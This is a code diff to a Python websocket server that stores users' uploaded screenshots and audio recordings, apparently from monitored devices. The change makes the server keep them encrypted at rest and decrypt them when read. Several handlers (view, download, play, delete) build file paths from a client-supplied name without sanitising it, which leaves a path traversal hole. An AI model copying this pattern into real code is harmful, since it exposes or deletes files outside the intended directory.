@@ -147,7 +147,7 @@ def _ensure_screenshot_dir(token: str) -> Path:
     return d
 
 def _get_screenshot_dir_size(d: Path) -> int:
-    return sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix == '.jpg')
+    return sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix in ('.jpg', '.enc'))
 
 def _get_quota_for_dir(d: Path) -> int:
     """Read saved quota from _quota.txt, or use global default."""
@@ -189,7 +189,7 @@ def _enforce_quota(d: Path, quota: int = 0):
     if quota <= 0:
         quota = _get_quota_for_dir(d)
 
-    all_files = [f for f in d.iterdir() if f.is_file() and f.suffix == '.jpg']
+    all_files = [f for f in d.iterdir() if f.is_file() and f.suffix in ('.jpg', '.enc')]
 
     # Group files by app/site category
     app_files = {}
@@ -209,24 +209,22 @@ def _enforce_quota(d: Path, quota: int = 0):
             log.info(f"Quota [{app}]: deleted {oldest.name}, {total//1024}KB/{quota//1024}KB")
 
 def _save_screenshot(token: str, enc_name: str, enc_data: bytes) -> Optional[str]:
-    """Decrypt and save screenshot. Returns decrypted filename or None."""
+    """Save screenshot encrypted at rest (.enc). Decrypts name for listing only."""
     try:
         d = _ensure_screenshot_dir(token)
         plain_name = _decrypt_filename(enc_name)
-        plain_data = _aes_decrypt(enc_data)
-        if not plain_data or len(plain_data) < 100:
-            log.warning(f"Screenshot decrypt failed or too small: name={enc_name[:30]} data_len={len(enc_data)} decrypted={len(plain_data) if plain_data else 0}")
+        if not enc_data or len(enc_data) < 100:
+            log.warning(f"Screenshot too small: name={enc_name[:30]} len={len(enc_data)}")
             return None
         safe_name = "".join(c for c in plain_name if c.isalnum() or c in ' _-').strip()
         if not safe_name:
             safe_name = f"shot_{int(time.time())}"
-        fpath = d / f"{safe_name}.jpg"
-        # Avoid overwrite
+        fpath = d / f"{safe_name}.enc"
         if fpath.exists():
-            fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.jpg"
-        fpath.write_bytes(plain_data)
+            fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.enc"
+        fpath.write_bytes(enc_data)   # stored encrypted — decrypted only on read
         _enforce_quota(d)
-        log.info(f"Screenshot saved: {safe_name} ({len(plain_data)//1024}KB) quota_dir={d}")
+        log.info(f"Screenshot saved (enc): {safe_name} ({len(enc_data)//1024}KB)")
         return safe_name
     except Exception as e:
         log.error(f"Screenshot save error: {e}")
@@ -237,7 +235,7 @@ def _list_screenshots(token: str) -> list:
     d = SCREENSHOT_DIR / token
     if not d.exists():
         return []
-    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix == '.jpg'],
+    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.jpg', '.enc') and not f.name.startswith('_')],
                    key=lambda f: f.stat().st_mtime, reverse=True)
     result = []
     for f in files:
@@ -250,19 +248,20 @@ def _list_screenshots(token: str) -> list:
         })
     return result
 
-def _make_thumbnail(fpath: Path, max_size: int = 200) -> bytes:
-    """Create JPEG thumbnail. Uses PIL if available, otherwise returns full image."""
+def _make_thumbnail(data: bytes, max_size: int = 200) -> bytes:
+    """Create JPEG thumbnail from raw bytes. Uses PIL if available."""
     try:
         from PIL import Image
         import io
-        img = Image.open(fpath)
+        img = Image.open(io.BytesIO(data))
         img.thumbnail((max_size, max_size))
         buf = io.BytesIO()
         img.save(buf, format='JPEG', quality=60)
         return buf.getvalue()
     except ImportError:
-        # No PIL — return full file (client will resize)
-        return fpath.read_bytes()
+        return data
+    except Exception:
+        return data
 
 def _load_templates() -> dict:
     if SCREENSHOT_TEMPLATES_FILE.exists():
@@ -276,6 +275,24 @@ def _save_templates(templates: dict):
     SCREENSHOT_TEMPLATES_FILE.parent.mkdir(parents=True, exist_ok=True)
     SCREENSHOT_TEMPLATES_FILE.write_text(json.dumps(templates, indent=2, ensure_ascii=False))
 
+# ─── Encrypted-at-rest read helpers ──────────────────────────────────────────
+def _read_screenshot_data(d: Path, name: str) -> Optional[bytes]:
+    """Read screenshot bytes — decrypts .enc on the fly, falls back to legacy .jpg."""
+    fp = d / f"{name}.enc"
+    if fp.exists(): return _aes_decrypt(fp.read_bytes())
+    fp = d / f"{name}.jpg"
+    if fp.exists(): return fp.read_bytes()
+    return None
+
+def _read_audio_data(d: Path, name: str) -> Optional[bytes]:
+    """Read audio bytes — decrypts .enc on the fly, falls back to legacy formats."""
+    fp = d / f"{name}.enc"
+    if fp.exists(): return _aes_decrypt(fp.read_bytes())
+    for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
+        fp = d / f"{name}{ext}"
+        if fp.exists(): return fp.read_bytes()
+    return None
+
 # ─── Audio Recording Storage ─────────────────────────────────────────────────
 def _ensure_audio_dir(token: str) -> Path:
     d = AUDIO_DIR / token
@@ -283,22 +300,20 @@ def _ensure_audio_dir(token: str) -> Path:
     return d
 
 def _save_audio(token: str, enc_name: str, enc_data: bytes) -> Optional[str]:
-    """Decrypt and save audio recording."""
+    """Save audio recording encrypted at rest (.enc). Decrypts name for listing only."""
     try:
         d = _ensure_audio_dir(token)
         plain_name = _decrypt_filename(enc_name)
-        plain_data = _aes_decrypt(enc_data)
-        if not plain_data or len(plain_data) < 100:
-            log.warning(f"Audio decrypt failed: name={enc_name[:30]} data={len(enc_data)}")
+        if not enc_data or len(enc_data) < 100:
+            log.warning(f"Audio too small: name={enc_name[:30]} len={len(enc_data)}")
             return None
         safe_name = "".join(c for c in plain_name if c.isalnum() or c in ' _-').strip()
         if not safe_name: safe_name = f"audio_{int(time.time())}"
-        fpath = d / f"{safe_name}.ogg"
-        if fpath.exists(): fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.ogg"
-        fpath.write_bytes(plain_data)
-        # Enforce quota
+        fpath = d / f"{safe_name}.enc"
+        if fpath.exists(): fpath = d / f"{safe_name}_{int(time.time()*1000)%10000}.enc"
+        fpath.write_bytes(enc_data)   # stored encrypted — decrypted only on read
         _enforce_audio_quota(d)
-        log.info(f"Audio saved: {safe_name} ({len(plain_data)//1024}KB)")
+        log.info(f"Audio saved (enc): {safe_name} ({len(enc_data)//1024}KB)")
         return safe_name
     except Exception as e:
         log.error(f"Audio save error: {e}")
@@ -307,7 +322,7 @@ def _save_audio(token: str, enc_name: str, enc_data: bytes) -> Optional[str]:
 def _list_audio(token: str) -> list:
     d = AUDIO_DIR / token
     if not d.exists(): return []
-    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav')],
+    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav', '.enc') and not f.name.startswith('_')],
                    key=lambda f: f.stat().st_mtime, reverse=True)
     return [{"name": f.stem, "ext": f.suffix, "size": f.stat().st_size, "time": int(f.stat().st_mtime)} for f in files]
 
@@ -320,7 +335,7 @@ def _get_audio_quota(d: Path) -> int:
 
 def _enforce_audio_quota(d: Path):
     quota = _get_audio_quota(d)
-    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav')],
+    files = sorted([f for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg', '.aac', '.opus', '.mp3', '.wav', '.enc') and not f.name.startswith('_')],
                    key=lambda f: f.stat().st_mtime)
     total = sum(f.stat().st_size for f in files)
     while total > quota and files:
@@ -1397,10 +1412,9 @@ async def handler(websocket, path: str):
                     elif sc_cmd == "screenshot_thumb":
                         name = msg.get("name", "")
                         d = SCREENSHOT_DIR / room.token
-                        fpath = d / f"{name}.jpg"
-                        if fpath.exists():
-                            thumb = _make_thumbnail(fpath)
-                            # Send as binary: STMB + name_len(4) + name + jpeg_thumb
+                        data = _read_screenshot_data(d, name)
+                        if data:
+                            thumb = _make_thumbnail(data)
                             name_bytes = name.encode('utf-8')
                             header = b'STMB' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + thumb)
@@ -1410,9 +1424,8 @@ async def handler(websocket, path: str):
                     elif sc_cmd == "screenshot_view":
                         name = msg.get("name", "")
                         d = SCREENSHOT_DIR / room.token
-                        fpath = d / f"{name}.jpg"
-                        if fpath.exists():
-                            data = fpath.read_bytes()
+                        data = _read_screenshot_data(d, name)
+                        if data:
                             name_bytes = name.encode('utf-8')
                             header = b'SIMG' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
@@ -1422,9 +1435,8 @@ async def handler(websocket, path: str):
                     elif sc_cmd == "screenshot_download":
                         name = msg.get("name", "")
                         d = SCREENSHOT_DIR / room.token
-                        fpath = d / f"{name}.jpg"
-                        if fpath.exists():
-                            data = fpath.read_bytes()
+                        data = _read_screenshot_data(d, name)
+                        if data:
                             name_bytes = name.encode('utf-8')
                             header = b'SDWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
@@ -1436,10 +1448,9 @@ async def handler(websocket, path: str):
                         d = SCREENSHOT_DIR / room.token
                         deleted = 0
                         for n in names:
-                            fpath = d / f"{n}.jpg"
-                            if fpath.exists():
-                                fpath.unlink()
-                                deleted += 1
+                            for ext in ('.enc', '.jpg'):
+                                fp = d / f"{n}{ext}"
+                                if fp.exists(): fp.unlink(); deleted += 1; break
                         await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}, ensure_ascii=False))
                         continue
                     elif sc_cmd == "screenshot_save_template":
@@ -1484,7 +1495,7 @@ async def handler(websocket, path: str):
                         app_usage = {}
                         if d.exists():
                             for f in d.iterdir():
-                                if f.is_file() and f.suffix == '.jpg':
+                                if f.is_file() and f.suffix in ('.jpg', '.enc'):
                                     sz = f.stat().st_size
                                     used += sz
                                     app = _get_app_from_filename(f.stem)
@@ -1629,13 +1640,8 @@ async def handler(websocket, path: str):
                     elif sc_cmd == "audio_play":
                         name = msg.get("name", "")
                         d = AUDIO_DIR / room.token
-                        # Find file with any audio extension
-                        fpath = None
-                        for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
-                            fp = d / f"{name}{ext}"
-                            if fp.exists(): fpath = fp; break
-                        if fpath:
-                            data = fpath.read_bytes()
+                        data = _read_audio_data(d, name)
+                        if data:
                             name_bytes = name.encode('utf-8')
                             header = b'APLY' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
@@ -1645,12 +1651,8 @@ async def handler(websocket, path: str):
                     elif sc_cmd == "audio_download":
                         name = msg.get("name", "")
                         d = AUDIO_DIR / room.token
-                        fpath = None
-                        for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
-                            fp = d / f"{name}{ext}"
-                            if fp.exists(): fpath = fp; break
-                        if fpath:
-                            data = fpath.read_bytes()
+                        data = _read_audio_data(d, name)
+                        if data:
                             name_bytes = name.encode('utf-8')
                             header = b'ADWN' + struct.pack('<I', len(name_bytes)) + name_bytes
                             await websocket.send(header + data)
@@ -1662,12 +1664,11 @@ async def handler(websocket, path: str):
                         d = AUDIO_DIR / room.token
                         deleted = 0
                         for n in names:
-                            for ext in ('.ogg', '.aac', '.opus', '.mp3', '.wav'):
+                            for ext in ('.enc', '.ogg', '.aac', '.opus', '.mp3', '.wav'):
                                 fp = d / f"{n}{ext}"
                                 if fp.exists():
-                                    fp.unlink()
-                                    deleted += 1
-                                    log.info(f"Audio deleted: {n}{ext}")
+                                    fp.unlink(); deleted += 1
+                                    log.info(f"Audio deleted: {n}{ext}"); break
                         log.info(f"Audio delete: {deleted} files from {len(names)} requested")
                         await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"deleted": deleted}}, ensure_ascii=False))
                         continue
@@ -1687,7 +1688,7 @@ async def handler(websocket, path: str):
                             except: pass
                         used = 0
                         if d.exists():
-                            used = sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg','.aac','.opus','.mp3','.wav'))
+                            used = sum(f.stat().st_size for f in d.iterdir() if f.is_file() and f.suffix in ('.ogg','.aac','.opus','.mp3','.wav','.enc'))
                         await websocket.send(json.dumps({"id": msg.get("id",""), "ok": True, "data": {"quota_mb": qmb, "used_bytes": used}}, ensure_ascii=False))
                         continue
 
